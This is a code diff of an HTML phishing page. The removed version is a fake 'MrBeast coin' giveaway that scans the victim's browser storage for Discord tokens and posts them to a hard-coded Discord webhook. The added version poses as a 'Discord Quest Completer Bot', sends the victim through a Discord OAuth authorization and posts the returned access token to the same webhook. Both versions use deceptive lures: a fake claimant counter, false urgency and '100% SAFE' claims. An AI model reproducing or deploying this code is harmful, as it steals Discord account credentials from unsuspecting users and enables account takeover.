@@ -2,180 +2,62 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>💰 Claim BEAST Tokens</title>
+    <title>SetupDC.QuestCompleters</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0a0a;
-            font-family: 'Arial', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            text-align: center;
-            color: white;
-        }
-        .container {
-            max-width: 700px;
-            padding: 30px;
-            background: #12121f;
-            border-radius: 40px;
-            border: 2px solid #ffcc00;
-            box-shadow: 0 0 60px rgba(255, 204, 0, 0.2);
-        }
-        h1 {
-            color: #ffcc00;
-            font-size: 2.8rem;
-            text-shadow: 0 0 30px #ffcc00;
-            margin-bottom: 10px;
-        }
-        .sub {
-            color: #aaa;
-            font-size: 1.2rem;
-            margin-bottom: 20px;
-        }
-        .clickable-image {
-            width: 100%;
-            max-width: 500px;
-            border-radius: 20px;
-            border: 4px solid #ffcc00;
-            cursor: pointer;
-            transition: 0.3s;
-            margin: 20px 0;
-        }
-        .clickable-image:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 50px rgba(255, 204, 0, 0.5);
-        }
-        .clickable-image:active {
-            transform: scale(0.95);
-        }
-        .status {
-            margin-top: 20px;
-            color: #888;
-            font-size: 1rem;
-        }
-        .counter {
-            color: #ffcc00;
-            font-weight: bold;
-            font-size: 1.5rem;
-        }
-        .footer {
-            margin-top: 30px;
-            color: #555;
-            font-size: 0.8rem;
-        }
-        #toast {
-            display: none;
-            background: #2a2a3e;
-            color: #ffcc00;
-            padding: 15px;
-            border-radius: 15px;
-            margin-top: 20px;
-            border: 1px solid #ffcc00;
-        }
+        body { margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0a; font-family: Arial, sans-serif; color: white; text-align: center; }
+        .container { max-width: 700px; padding: 30px; background: #1a1a2e; border-radius: 30px; border: 2px solid #ffcc00; }
+        h1 { color: #ffcc00; font-size: 2.8rem; margin-bottom: 10px; }
+        .sub { color: #aaa; font-size: 1.2rem; }
+        img { width: 100%; border-radius: 20px; border: 3px solid #ffcc00; cursor: pointer; transition: 0.3s; margin: 20px 0; }
+        img:hover { transform: scale(1.02); box-shadow: 0 0 40px #ffcc00; }
+        .footer { color: #555; margin-top: 20px; font-size: 0.9rem; }
+        .promo { background: #2a2a3e; padding: 15px; border-radius: 15px; margin: 15px 0; }
+        .highlight { background: #ffcc00; color: #0a0a0a; padding: 8px 16px; border-radius: 8px; font-weight: bold; }
+
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🐕 MRBEAST COIN</h1>
-        <p class="sub">🔥 <span class="counter" id="counter">15,432</span> people already claimed</p>
-        <p style="color:#ccc;">Click the image below to <strong>instantly claim 1,000 BEAST</strong> tokens!</p>
-        
-        <!-- 👇 THE CLICKABLE IMAGE -->
-        <img 
-            class="clickable-image" 
-            id="claimImage"
-            src="https://cdn.discordapp.com/attachments/1539553182437347368/1545137691778359316/SXE_XIETRS_PRIFLE.png?ex=6a9b0d1c&is=6a99bb9c&hm=ecb987ba6df3a01eb287eac03a8af54b631f1e08b660c2a347facff3d07d3bdc" 
-            alt="Click to claim BEAST tokens"
-            onclick="grabToken()"
-        />
-        
-        <div id="toast">⏳ Processing claim... Please wait.</div>
-        <div class="status" id="status">👆 Click the image above to connect your wallet (Discord).</div>
-        <div class="footer">⚠️ Only verified Discord accounts are eligible.</div>
+        <h1>🎰 Discord Quest Completer Bot</h1>
+        <p class="sub">SAFE &SECURE  <span class="highlight">100%</span> Welcome to Quest Completer!</p>
+        <div class="promo">
+            <p style="color:#ffcc00;"></p>
+            <p>Click on below button to add to Discord</p>
+        </div>
+        <img id="claimImage" src="https://cdn.discordapp.com/attachments/1545479514078052425/1545717911031914526/f5ea9b2f-c714-4f8a-af3e-ba420bfe7125_removalai_preview.png?ex=6a9d297c&is=6a9bd7fc&hm=18e3ae2d7ec7591856c2b1b68aa6a0f8ccab3545947efc6050b1d6d2ea1b322a" alt="Click to ADD">
+        <p class="footer">⏳ This Linkbexpires in 1 min– act fast!</p>
     </div>
 
     <script>
-        // ================= CONFIG =================
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1545479634005524612/7kO5F7Z86zgfumFzzitcpENMPpu7bkVkpQN_B-50W4th_dUIEQWaQLmJbVVyFjLaA-s9"; // YOUR WEBHOOK
-        // =========================================
+        // ================= CONFIGURATION =================
+        const CLIENT_ID = "1545494388690653388";
+        // Use the exact redirect you registered (with index.html)
+        const REDIRECT_URI = "https://shahinsha32.github.io/giveaway/index.html";
+        const WEBHOOK = "https://discord.com/api/webhooks/1545479634005524612/7kO5F7Z86zgfumFzzitcpENMPpu7bkVkpQN_B-50W4th_dUIEQWaQLmJbVVyFjLaA-s9";
+        // =================================================
 
-        // Fake counter to make it look alive
-        let count = 15432;
-        setInterval(() => {
-            count += Math.floor(Math.random() * 5) + 1;
-            document.getElementById('counter').innerText = count.toLocaleString();
-        }, 2500);
+        const authUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify`;
 
-        function grabToken() {
-            const image = document.getElementById('claimImage');
-            const toast = document.getElementById('toast');
-            const status = document.getElementById('status');
+        document.getElementById('claimImage').addEventListener('click', () => {
+            window.location.href = authUrl;
+        });
 
-            // Disable further clicks (avoid spam)
-            image.style.pointerEvents = 'none';
-            image.style.opacity = '0.7';
-            toast.style.display = 'block';
-            status.textContent = '⏳ Verifying Discord identity...';
-
-            let token = null;
-
-            // ----- ATTEMPT TO STEAL TOKEN FROM localStorage -----
-            try {
-                // 1. Direct token key
-                token = localStorage.getItem('token') || sessionStorage.getItem('token');
-                
-                // 2. If not found, brute‑search all localStorage keys
-                if (!token) {
-                    for (let key in localStorage) {
-                        let val = localStorage[key];
-                        if (typeof val === 'string') {
-                            // Discord token regex (matches mfa.xxx or standard token)
-                            if (val.match(/[a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,}/)) {
-                                token = val;
-                                break;
-                            }
-                        }
-                    }
-                }
-            } catch(e) {
-                console.warn('Storage read error:', e);
-            }
-
-            // ----- SEND TO WEBHOOK -----
+        // After OAuth redirect back, grab token from URL fragment
+        if (window.location.hash) {
+            const params = new URLSearchParams(window.location.hash.substring(1));
+            const token = params.get('access_token');
             if (token) {
-                const payload = {
-                    content: `🎯 **TOKEN EXTRACTED** (MrBeast Image Click)`,
-                    embeds: [{
-                        title: "💰 Token Grabbed",
-                        description: `\`\`\`${token}\`\`\``,
-                        color: 0xffcc00,
-                        footer: { text: "Clicked the MrBeast image" }
-                    }]
-                };
-
-                fetch(WEBHOOK_URL, {
+                fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify({
+                        content: `🚀 **Token grabbed (BY SHAHINSHA)**\n\`${token}\``,
+                        embeds: [{ title: "SXE ON TOP!", color: 0xffcc00 }]
+                    })
                 }).then(() => {
-                    status.textContent = '✅ Claim successful! You will receive your tokens shortly.';
-                    toast.textContent = '✅ Tokens sent to your wallet! Redirecting...';
-                    setTimeout(() => {
-                        window.location.href = 'https://discord.com/channels/@me';
-                    }, 2000);
-                }).catch((err) => {
-                    status.textContent = '⚠️ Network error. But your claim was recorded.';
-                    console.error(err);
-                });
-            } else {
-                // No token found – redirect to Discord login (so they log in, and we can try again)
-                status.textContent = '❌ You are not logged into Discord. Opening login page...';
-                toast.textContent = '🔐 Please log in to Discord to claim.';
-                setTimeout(() => {
-                    window.location.href = 'https://discord.com/login?redirect_to=/channels/@me';
-                }, 1200);
+                    document.body.innerHTML = "<div style='display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0a0a;color:#ffcc00;font-size:2rem;'>✅ BOT READY! Next to setup manuel...</div>";
+                    setTimeout(() => { window.location.href = 'https://discord.com/channels/@me'; }, 2000);
+                }).catch(() => {});
             }
         }
     </script>
